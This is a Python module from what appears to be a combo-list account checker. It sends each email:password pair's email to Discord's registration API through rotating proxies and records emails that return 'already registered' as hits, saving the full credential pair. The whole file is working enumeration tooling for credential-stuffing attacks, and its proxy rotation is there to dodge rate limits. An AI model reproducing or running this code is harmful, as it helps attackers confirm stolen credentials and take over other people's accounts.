from modules.variables import Checker
from random import choice, random
from requests import post
from modules.functions import bad_proxy, log,save,set_proxy
from string import ascii_letters as l, digits as d
from random import choices

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        payload = {"fingerprint":"793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM","email":email,"username":"".join(choices(l+d,k=6)),"password":"rth21e98!fmPP","invite":None,"consent":True,"date_of_birth":"1993-05-03","gift_code_sku_id":None,"captcha_key":None}
        try:
            a = post("https://discord.com/api/v8/auth/register",json=payload,proxies=proxy_set,timeout=Checker.timeout).text
            if "EMAIL_TYPE_INVALID_EMA" in a or "token" in a or "captcha-required" in a:
                retries += 1
            elif "EMAIL_ALREADY_REGISTERED" in a:
                if not Checker.cui:
                    log("good",email+":"+password,"DiscordVM")
                save("DiscordVM","good",Checker.time,email+":"+password)
                Checker.good += 1
                Checker.cpm += 1
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return